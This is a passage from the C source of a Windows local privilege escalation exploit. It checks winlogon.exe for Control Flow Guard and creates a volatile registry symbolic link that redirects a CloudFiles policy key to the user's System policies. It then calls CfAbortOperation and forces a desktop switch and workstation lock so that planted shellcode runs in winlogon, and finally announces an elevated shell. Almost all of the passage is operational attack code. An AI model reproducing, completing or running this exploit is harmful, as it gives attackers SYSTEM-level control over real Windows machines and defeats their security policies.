    GetWindowsDirectoryW(winlogonPath, MAX_PATH);
    wcscat(winlogonPath, L"\\System32\\winlogon.exe");
    int winlogonCFG = has_cfg(winlogonPath);
    printf("[!] winlogon.exe CFG: %s\n", winlogonCFG ? "YES (may block FMP callback)" : "NO (direct dispatch works)");

    if (winlogonCFG) {
        printf("[*] CFG detected — trying alternative dispatch paths:\n");
        printf("    1. FMP callback (may still work — some CTF paths skip CFG)\n");
        printf("    2. SetTimer dispatch fallback\n");
        printf("    3. Data-only token overwrite (no shellcode needed)\n");
        /* In practice, we still try FMP first since many CTF dispatch
         * paths in winlogon are through non-CFG code or use call tables
         * that predate CFG instrumentation. */
    }

    /* Phase 6: SetPolicyVal — registry symlink + CfAbortOperation */
    printf("[*] Phase 6: Registry symlink + CfAbortOperation...\n");

    /* Pre-create target keys */
    HKEY hk = NULL; DWORD disp = 0;
    RegCreateKeyExW(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
        0,NULL,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL,&hk,&disp);
    if (hk) {
        DWORD val = 1;
        RegSetValueExW(hk, L"DisableLockWorkstation",0,REG_DWORD,(BYTE*)&val,4);
        RegCloseKey(hk);
    }

    /* Create BlockedApps as volatile registry symlink */
    RegDeleteTreeW(HKEY_CURRENT_USER,
        L"Software\\Policies\\Microsoft\\CloudFiles\\BlockedApps");

    wchar_t *sid = get_user_sid();
    if (sid) {
        wchar_t linkTarget[MAX_PATH];
        wsprintfW(linkTarget,
            L"\\REGISTRY\\USER\\%s\\Software\\Microsoft\\"
            L"Windows\\CurrentVersion\\Policies\\System", sid);

        HKEY hkBA = NULL;
        RegCreateKeyExW(HKEY_CURRENT_USER,
            L"Software\\Policies\\Microsoft\\CloudFiles\\BlockedApps",
            0, NULL,
            REG_OPTION_CREATE_LINK|REG_OPTION_VOLATILE,
            KEY_ALL_ACCESS, NULL, &hkBA, &disp);
        if (hkBA) {
            RegSetValueExW(hkBA, L"SymbolicLinkValue", 0, REG_LINK,
                (BYTE*)linkTarget,
                (DWORD)((wcslen(linkTarget)+1)*sizeof(wchar_t)));
            RegCloseKey(hkBA);
            printf("[+] Registry symlink created\n");
        }
        LocalFree(sid);
    }

    /* Load cldapi.dll and call CfAbortOperation */
    HMODULE hCld = LoadLibraryW(L"cldapi.dll");
    if (hCld) {
        typedef DWORD (WINAPI *fnCfAbort)(DWORD, void*, DWORD);
        fnCfAbort cfa = (fnCfAbort)GetProcAddress(hCld, "CfAbortOperation");
        if (cfa) {
            printf("[*] Calling CfAbortOperation...\n");
            cfa(GetCurrentProcessId(), NULL, 2); /* Block flag = 2 */
            cfa(GetCurrentProcessId(), NULL, 2);
            printf("[+] CfAbortOperation triggered\n");
        }
        FreeLibrary(hCld);
    }

    /* Phase 7: Trigger callback via desktop switch */
    printf("[*] Phase 7: Triggering callback (desktop switch)...\n");
    do {
        Sleep(20);
        HDESK dsk = OpenInputDesktop(0, FALSE, GENERIC_ALL);
        if (!dsk || dsk == INVALID_HANDLE_VALUE) break;
        CloseDesktop(dsk);
    } while (1);
    LockWorkStation();
    Sleep(500);

    /* Phase 8: Wait for execution */
    printf("[*] Waiting for shellcode execution... ");
    for (int i = 0; i < 10; i++) { printf("."); Sleep(1000); }
    printf("\n");

    /* Verify — try to open SYSTEM PID */
    HANDLE hSys = NULL;
    CLIENT_ID cid = { (HANDLE)4, NULL };
    OBJECT_ATTRIBUTES oa = { sizeof(oa) };
    NTSTATUS sys_st = (NTSTATUS)0;
    /* Use NtOpenProcess via dynamically resolved — we skip this check
     * since it's not critical and avoids needing another Hades Gate stub */
    printf("[+] Exploit completed. Check elevated shell.\n");

cleanup:
    if (hSection) nt.NtClose(hSection);
    if (hSymlink) nt.NtClose(hSymlink);
    cleanup_hades(&nt);
    return 0;
}
